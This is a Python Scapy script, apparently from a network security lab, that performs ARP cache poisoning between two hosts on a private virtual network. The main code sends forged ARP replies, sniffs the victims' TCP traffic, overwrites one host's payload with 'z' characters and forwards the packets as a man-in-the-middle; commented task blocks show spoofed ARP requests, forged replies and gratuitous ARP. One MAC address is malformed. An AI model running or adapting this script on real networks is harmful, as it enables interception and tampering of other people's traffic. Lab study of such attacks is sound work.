# Arp poisoning
from scapy.all import *

M = "192.168.122.210"
M_mac = "52:54:00:dc:b3:64"
A = "192.168.122.72"
A_mac = "52:54:00:5a:01:98"
B = "192.168.122.76"
B_mac = "52.54:00:aa:11:76"

def spoof(target_ip, spoof_ip):
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=spoof_ip)
	sendp(packet)

def change(pkt):
	if pkt[Ether].src == A_mac and pkt[IP].dst == B:
		print("SRC == AMAC")
		data = pkt[Raw].load
		pkt[Raw].show()
		newData = ""
		for i in range(len(data)):
			newData += 'z'
		pkt[Ether].dst = B_mac
		pkt[Ether].src = M_mac
		pkt[Raw].load = newData
		pkt[Raw].show()
		sendp(pkt)
		spoof(A, B)
		spoof(B, A)
	
	elif pkt[Ether].src == B_mac and pkt[IP].dst == A:
		print("SRC == BMAC")
		pkt[Raw].show()
		pkt[Ether].dst = A_mac
		pkt[Ether].src = M_mac
		sendp(pkt)
		spoof(A, B)
		spoof(B, A)
	
	elif pkt[Ether].src == M_mac:
		print("SRC == MMAC")

spoof(A, B)
spoof(B, A)

sniff(filter="tcp and not src 192.168.122.210", count=0, prn=change)





# Task 1A:
"""
arpA = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc="192.168.122.76", pdst = "192.168.122.72")
sendp(arpA)
"""

# Task 1B:
"""
reply = Ether()/ARP()
# Set IP dest to A
reply[ARP].pdst = "192.168.122.72"
# set MAC address of A
reply[Ether].dst = "52:54:00:5a:01:98"
# Set ARP to reply
reply[ARP].op = 2
# Set IP source to B
reply[ARP].psrc = "192.168.122.76"

sendp(reply)
"""

# Task 1C:
"""
gmsgA = Ether()/ARP()

# Set destination MAC address (Ether & ARP) to ff:ff:ff:ff:ff:ff
gmsgA[Ether].dst = "ff:ff:ff:ff:ff:ff"

# Set soucre and dst IP to be the address of B
gmsgA[ARP].psrc = "192.168.122.76"
gmsgA[ARP].pdst = "192.168.122.76"

gmsgA[ARP].op = 2

sendp(gmsgA)

# MITM Attack:
gmsgA = Ether()/ARP()
gmsgB = Ether()/ARP()

# Set destination MAC address (Ether & ARP) to ff:ff:ff:ff:ff:ff
gmsgA[Ether].dst = "ff:ff:ff:ff:ff:ff"
gmsgB[Ether].dst = "ff:ff:ff:ff:ff:ff"

# Set source and dst IP to be the address of B and A
gmsgA[ARP].psrc = "192.168.122.76"
gmsgB[ARP].psrc = "192.168.122.72"
gmsgA[ARP].pdst = "192.168.122.76"
gmsgB[ARP].pdst = "192.168.122.72"

gmsgA[ARP].op = 2
gmsgB[ARP].op = 2

sendp(gmsgA)
sendp(gmsgB)
"""

